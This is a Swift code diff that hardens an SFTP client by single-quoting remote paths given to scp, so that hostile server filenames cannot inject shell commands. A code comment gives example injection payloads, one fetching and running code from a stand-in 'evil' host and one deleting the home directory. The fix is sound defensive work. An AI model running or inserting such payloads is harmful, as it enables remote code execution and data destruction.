@@ -43,7 +43,7 @@ enum SFTPClient {
     /// Download a single file to a local destination. Uses `scp`.
     @discardableResult
     static func download(_ conn: Connection, remotePath: String, to local: URL) -> Bool {
-        let target = "\(conn.sshTarget):\(remotePath)"
+        let target = "\(conn.sshTarget):\(remoteQuote(remotePath))"
         let p = Process()
         p.launchPath = "/usr/bin/scp"
         var args = ["-q", "-o", "BatchMode=yes", "-o", "ConnectTimeout=7"]
@@ -58,7 +58,7 @@ enum SFTPClient {
     /// Upload a local file to a remote path.
     @discardableResult
     static func upload(_ conn: Connection, local: URL, to remotePath: String) -> Bool {
-        let target = "\(conn.sshTarget):\(remotePath)"
+        let target = "\(conn.sshTarget):\(remoteQuote(remotePath))"
         let p = Process()
         p.launchPath = "/usr/bin/scp"
         var args = ["-q", "-o", "BatchMode=yes", "-o", "ConnectTimeout=7"]
@@ -82,6 +82,13 @@ enum SFTPClient {
 
     private static func escape(_ s: String) -> String {
         "\"" + s.replacingOccurrences(of: "\"", with: "\\\"") + "\""
+    }
+
+    /// Single-quote a path for the remote shell that `scp` runs the source/target
+    /// through — so a filename from a hostile server's `ls` listing can't inject
+    /// remote commands (e.g. `$(curl evil|sh)` or `;rm -rf ~`).
+    private static func remoteQuote(_ s: String) -> String {
+        "'" + s.replacingOccurrences(of: "'", with: "'\\''") + "'"
     }
 
     private static func run(_ conn: Connection, stdin: String) -> String? {
